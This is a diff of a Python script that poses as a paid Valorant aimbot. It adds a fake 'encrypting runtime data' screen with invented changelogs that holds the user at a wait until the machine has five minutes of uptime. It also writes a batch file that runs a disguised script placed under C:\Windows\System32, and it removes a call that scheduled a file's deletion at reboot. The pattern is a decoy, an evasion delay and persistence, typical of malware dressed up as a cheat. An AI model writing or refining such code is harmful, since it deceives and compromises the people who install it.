@@ -206,6 +206,8 @@ import ctypes
 import os
 import shutil
 os.system('cls')
+
+'''
 def check_uptime():
     boot_time = get_boot_time()
     if boot_time is None:
@@ -244,6 +246,60 @@ def check_uptime():
             time.sleep(1)
             time_remaining -= timedelta(seconds=1)
         print("Completed encryption.")
+
+
+check_uptime()
+'''
+
+def check_uptime():
+    boot_time = get_boot_time()
+    if boot_time is None:
+        print("Could not determine boot time.")
+        return
+
+    current_time = datetime.now()
+    uptime = current_time - boot_time
+
+    print("Current Time:", current_time.strftime("%Y-%m-%d %H:%M:%S"))
+    print("Uptime Duration:", uptime)
+
+    if uptime >= timedelta(minutes=5):
+        print("")   
+    else:
+        time_remaining = timedelta(minutes=5) - uptime
+        print("INFO")
+
+        while time_remaining.total_seconds() > 0:
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print("")
+            print("")
+            print("***ABOUT PREMIUM***")
+            print("---To ensure 99% safety of premium cheat, it must encrypt all runtime data.")
+            print("---Please be patient, it will take a few minutes.")
+            print("---No need to restart PC when switching to another account.")
+            print("---For Windows 11 users, disable SVM in bios in order for premium to work.")
+            print("")
+            print("***CHANGE LOGS (01-03-2025):")
+            print("> Fixed the issue on Windows 11 where sometimes a1mbot won't work.")
+            print("> Faster runtime.")
+            print("> Added a config manager. Getting you ready for the next major update.")
+            print("")
+            print("***FUTURE UPDATES FOR PREMIUM***")
+            print("> Smooth Triggerbot to be added later in 2025.")
+            print("> To change config of aimb0t SAFELY while in middle of the game in Valorant. (IN TESTING)")
+            print("")
+            print("/////////////////////////////////////////////////////////////////////////////////////////////")
+            print("<Developer: imklei>")
+            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
+            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
+            print("Please wait...")
+            time.sleep(1)
+            current_time = datetime.now()
+            uptime = current_time - boot_time
+            time_remaining = timedelta(minutes=5) - uptime
+
+        print("Completed encryption.")
+        
 
 
 check_uptime()
@@ -353,9 +409,7 @@ def create_batch_file(python_command, script_name):
         print(f"")
     else:
         print("")
-with open(xsadasdpath, 'w') as temp_file:
-    temp_file.write("Temporary content")
-ctypes.windll.kernel32.MoveFileExW(xsadasdpath, None, 4)
+
 create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aespremv1_01032025.py")
 def run_batch_file(batch_file_path):
     try:
